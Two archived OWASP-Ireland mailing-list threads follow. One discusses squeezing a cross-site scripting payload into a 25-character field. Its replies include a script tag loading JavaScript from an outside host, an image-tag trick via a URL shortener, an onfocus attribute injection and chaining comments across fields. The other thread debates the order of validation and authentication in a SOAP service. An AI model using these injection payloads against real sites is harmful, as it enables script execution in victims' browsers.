Subject: [OWASP-Ireland] XSS in 25 characters or less
Message-ID: <BAY18-F24A22E2A3957D0D694E545A6170@phx.gbl>

Hi,
I have a window of 25 chars to perform a XSS exploit.
anything more is truncated by the server.

<script src=http://a.com/z.js></script>

- this is 39 chars
We can do HTML injection ("<a href=....") to a degree but anyone any ideas 
on how to execute script in such a small window (25 chars)?
we need to stay in the same domain (xyz.com) inorder to make the attack 
useful. so redirecting to another domain with the "<a href..." is no good.

First correct answer gets a pint of Guinness (Larry S, you're not included 
for the pint as I owe you too many).

You could use tinyurl.com to embed a malicious link
(say, one that executes a XST attack). This still
requires a windows larger than 25 to get the domain to
execute a malicious XSS, I think.

Actually, you could include the  <img
src=tinyurl.com/whatever>
and have the tiny url point to a java script
somewhere.

Do I get my pint?

Yeah, quite right... well, almost - just needed a space and an extra slash:

Interestingly, why have they only restricted it to 25 characters and  
where is this being enforced and by what?

I ran into exactly this issue today. Since it was injecting into a form 
value, I used something like " onfocus=alert() " -- pretty short!

One other cool technique invented (as far as I know) by Bruce Mayhew here is 
to inject a comment start <!-- in one field and a closer in the next 
field -->.  That way you can chain the fields together and your script can 
span fields.

Subject: [OWASP-Ireland] Web services - DV Auth or Auth DV???
Message-ID: <BAY18-F17C120476027678743A045A60D0@phx.gbl>

Hi,
Just I'd throw this out so see opinion:

A webservice:
Uses HTTPS. The Payload (SOAP) is in the HTTP Header.
The password and UserId are also in the HTTP header as header parameters.
(We can see the obvious issues here already?!#!?)

So,
The service needs a requester to be authenticated.
So sneding SOAP request (Over HTTPS) to this service gives us "Access 
Denied" as I put in an incorrect password...ok so far
Sending a modified request which the XML schema does not like (malformed 
request for example) gives us a Data validation error....So DV is done 
before authentication.

Which should come first in the case of webservices...?
DV or Auth.
If DV is first we may be able to do a DoS by sending 1000's of requests, 
each one needing to be DV'ed. (Webservices are prone to DOS attacks).
By doing Auth first, we need to DV the userId and password, Authenticate and 
then continue with the DV, which is complex....

Anyone have any ideas which should be first, the "chicken or the egg"?
I have my own opinions but what do you good people think?
